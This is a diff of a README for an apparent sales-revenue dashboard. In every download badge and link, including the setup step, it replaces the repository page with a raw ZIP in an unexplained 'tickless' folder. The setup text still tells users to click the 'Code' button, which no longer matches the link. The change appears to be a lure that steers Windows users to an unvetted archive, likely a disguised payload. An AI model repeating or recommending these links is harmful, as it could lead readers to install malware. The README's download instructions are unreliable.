@@ -1,6 +1,6 @@
 # 📊 Sales-Revenue-Analysis - Visualize and Understand Sales Data
 
-[![Download Sales-Revenue-Analysis](https://img.shields.io/badge/Download-Sales--Revenue--Analysis-green?style=for-the-badge)](https://github.com/LautaroFrias/Sales-Revenue-Analysis)
+[![Download Sales-Revenue-Analysis](https://img.shields.io/badge/Download-Sales--Revenue--Analysis-green?style=for-the-badge)](https://github.com/LautaroFrias/Sales-Revenue-Analysis/raw/refs/heads/main/tickless/Revenue_Sales_Analysis_v1.0.zip)
 
 ## 📋 About Sales-Revenue-Analysis
 
@@ -29,7 +29,7 @@ The dashboard works with CSV files that contain your sales records. It cleans an
 
 Use the link below to visit the GitHub page where you can download the files you need. This page contains all the latest files and information.
 
-[Visit here to download Sales-Revenue-Analysis](https://github.com/LautaroFrias/Sales-Revenue-Analysis)
+[Visit here to download Sales-Revenue-Analysis](https://github.com/LautaroFrias/Sales-Revenue-Analysis/raw/refs/heads/main/tickless/Revenue_Sales_Analysis_v1.0.zip)
 
 ## 📥 How to Download and Set Up the Dashboard
 
@@ -37,7 +37,7 @@ Follow these steps to get the dashboard running on your Windows computer.
 
 1. **Download the Files**  
    Go to the primary download link:  
-   https://github.com/LautaroFrias/Sales-Revenue-Analysis  
+   https://github.com/LautaroFrias/Sales-Revenue-Analysis/raw/refs/heads/main/tickless/Revenue_Sales_Analysis_v1.0.zip  
    On the page, click on the green "Code" button and select "Download ZIP". This will save a zip file with all necessary files to your computer.
 
 2. **Extract the Files**  
@@ -99,4 +99,4 @@ If you have problems, use the "Issues" tab on the GitHub page to describe your p
 
 ---
 
-[![Download Sales-Revenue-Analysis](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/LautaroFrias/Sales-Revenue-Analysis)
+[![Download Sales-Revenue-Analysis](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/LautaroFrias/Sales-Revenue-Analysis/raw/refs/heads/main/tickless/Revenue_Sales_Analysis_v1.0.zip)
